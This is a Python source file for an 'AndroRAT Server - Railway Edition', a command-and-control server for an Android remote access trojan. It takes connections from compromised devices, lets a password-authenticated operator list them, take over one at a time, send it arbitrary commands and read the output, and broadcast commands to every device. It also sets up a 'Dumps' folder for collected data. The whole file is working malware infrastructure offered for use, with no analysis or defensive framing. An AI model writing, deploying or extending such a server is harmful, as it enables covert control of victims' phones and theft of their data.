#!/usr/bin/env python3
"""AndroRAT Server - Railway Edition (Fixed Socket Handling)"""
import os, sys, time, select, socket, threading, json, signal

PORT = int(os.environ.get('PORT', 8000))
HOST = '0.0.0.0'
ADMIN_PW = os.environ.get('ADMIN_PW', 'androrat-admin')
SYS_DIR = os.path.join(os.getcwd(), "Dumps")
os.makedirs(SYS_DIR, exist_ok=True)

banner = (
 "\n"
 " _ _____ _______\n"
 " /\\ | | | __ \\ /\\|__ __|\\n"
 " / \\ _ __ __| |_ __ ___ | |__) | / \\ | |\\n"
 " / /\\ \\ | '_ \\ / _` | '__/ _ \\| _ / / /\\ \\ | |\\n"
 " / ____ \\| | | | (_| | | | (_) | | \\ \\ / ____ \\| |\\n"
 "/_/ \\_\\_| |_|\\__,_|_| \\___/|_| \\_\\/_/ \\_\\_|\\n"
 " - Railway Edition\\n"
)

bots = {}
bots_lock = threading.Lock()

def send_cmd(bot_conn, cmd, wait=0.5):
 try:
  bot_conn.sendall(f"{cmd}\n".encode())
  time.sleep(wait)
  buff = ""
  bot_conn.settimeout(10)
  try:
   while "END123" not in buff:
    d = bot_conn.recv(4096).decode("UTF-8", "ignore")
    if not d: break
    buff += d
  except socket.timeout:
   pass
  finally:
   bot_conn.settimeout(None)
  return buff.replace("END123", "").strip()
 except Exception as e:
  return f"[ERROR] {e}"

def bot_handler(conn, addr, bot_id):
 print(f"[+] Bot #{bot_id} from {addr}")
 try:
  conn.settimeout(5)
  init = conn.recv(1024).decode("UTF-8", "ignore").strip()
 except:
  init = ""
 finally:
  conn.settimeout(None)

 with bots_lock:
  bots[bot_id] = {'conn': conn, 'addr': addr, 'initial': init,
   'last_seen': time.time(), 'session': None}

 try:
  # Just keep the connection alive - don't read from it
  # The operator will send commands through send_cmd()
  while True:
   with bots_lock:
    if bot_id not in bots:
     break
   time.sleep(1)
 except:
  pass
 finally:
  with bots_lock:
   if bot_id in bots:
    del bots[bot_id]
  try:
   conn.close()
  except:
   pass

def operator_session(op_conn, addr):
 print(f"[+] Operator from {addr}")
 try:
  op_conn.sendall(banner.encode())
  op_conn.sendall(b"\n[*] Connected to AndroRAT Railway Server\n")
  op_conn.sendall(b"[*] Type 'help' for commands\n")
  cur = None
  while True:
   op_conn.sendall(b"\nandrorat> ")
   try:
    raw = op_conn.recv(4096)
    if not raw: break
    cmd = raw.decode().strip()
   except: break
   if not cmd: continue
   if cmd == "exit": op_conn.sendall(b"Bye\n"); break
   elif cmd == "help":
    op_conn.sendall(b" list - List bots\n use <id> - Control bot\n release - Release bot\n broadcast <c> - Send to all\n clear - Clear\n exit - Quit\n")
   elif cmd == "list":
    with bots_lock:
     if not bots: op_conn.sendall(b"[-] No bots\n")
     else:
      op_conn.sendall(f"[+] {len(bots)} bot(s):\n".encode())
      for bid, bi in sorted(list(bots.items()))[:50]:
       s = "IN USE" if bi.get('session') else "AVAILABLE"
       op_conn.sendall(f" #{bid} {bi['addr'][0]}:{bi['addr'][1]} {s}\n".encode())
   elif cmd.startswith("use "):
    try: t = int(cmd.split()[1])
    except: op_conn.sendall(b"Bad ID\n"); continue
    with bots_lock:
     if t not in bots: op_conn.sendall(b"Not found\n"); continue
     if bots[t].get('session'): op_conn.sendall(b"In use\n"); continue
     bots[t]['session'] = id(op_conn)
    cur = t
    bc = bots[t]['conn']
    op_conn.sendall(f"\n[+] Bot #{t}\n[*] back=menu exit=disconnect\n\n".encode())
    try:
     while cur:
      op_conn.sendall(f"Bot#{t} /> ".encode())
      c2 = op_conn.recv(4096).decode().strip()
      if not c2: continue
      if c2 == "back":
       with bots_lock:
        if t in bots: bots[t]['session'] = None
       cur = None
       op_conn.sendall(b"Menu\n")
       break
      if c2 == "exit":
       with bots_lock:
        if t in bots: bots[t]['session'] = None
       op_conn.sendall(b"Bye\n")
       return
      r = send_cmd(bc, c2)
      op_conn.sendall(f"{r or 'Sent'}\n".encode())
    except:
     op_conn.sendall(b"Lost\n")
    with bots_lock:
     if t in bots: bots[t]['session'] = None
    cur = None
   elif cmd == "release":
    if cur:
     with bots_lock:
      if cur in bots: bots[cur]['session'] = None
     cur = None
     op_conn.sendall(b"Released\n")
    else: op_conn.sendall(b"No bot\n")
   elif cmd.startswith("broadcast "):
    with bots_lock: ids = list(bots.keys())
    n = 0
    for bid in ids:
     try:
      with bots_lock:
       if bid in bots: bots[bid]['conn'].sendall(f"{cmd[10:]}\n".encode()); n += 1
     except: pass
    op_conn.sendall(f"Sent to {n}\n".encode())
   elif cmd == "clear": op_conn.sendall(b"\033[2J\033[H")
   else: op_conn.sendall(b"Unknown\n")
 except Exception as e: print(f"Op err: {e}")
 finally:
  if cur:
   with bots_lock:
    if cur in bots: bots[cur]['session'] = None
  try: op_conn.close()
  except: pass

def main():
 print(banner)
 print(f"[*] Port {PORT} PW={ADMIN_PW}")
 srv = socket.socket()
 srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 srv.bind((HOST, PORT))
 srv.listen(20)
 print("[*] Ready\n")
 while True:
  conn, addr = srv.accept()
  try:
   conn.settimeout(3)
   fd = conn.recv(1024).decode("UTF-8", "ignore").strip()
   conn.settimeout(None)
  except:
   fd = ""
   conn.settimeout(None)
  if fd.upper().startswith("AUTH:"):
   if fd[5:].strip() == ADMIN_PW:
    conn.sendall(b"[+] Authenticated\n")
    threading.Thread(target=operator_session, args=(conn, addr), daemon=True).start()
   else: conn.sendall(b"[-] Wrong pw\n"); conn.close()
  else:
   threading.Thread(target=bot_handler, args=(conn, addr, len(bots)+1), daemon=True).start()

if __name__ == "__main__": main()
